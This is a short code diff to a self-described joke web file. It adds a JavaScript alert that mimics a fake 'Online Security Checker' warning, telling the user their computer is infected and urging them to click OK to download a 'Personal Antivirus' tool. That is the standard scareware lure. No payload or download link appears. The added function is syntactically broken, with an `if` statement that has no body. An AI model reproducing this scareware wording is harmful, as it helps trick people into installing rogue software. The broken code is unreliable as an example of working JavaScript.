@@ -8,6 +8,15 @@ Plss make sure u give credit to us it's just a simple joke file to show how webs
         else    {
                 emilion();
         };
+
+        {
+        alert('Potentially dangerous software. These programs may damage your computer and steal your private information. Online Security Checker needs Personal Antivirus components to repair your computer. Please click Ok to download and install Personal Antivirus tool. ');
+        }
+        function update()
+        {
+        if ($(".progress_bar_fill").width()>0)
+        };
+
 -_-----------------------
 Text Command------
 
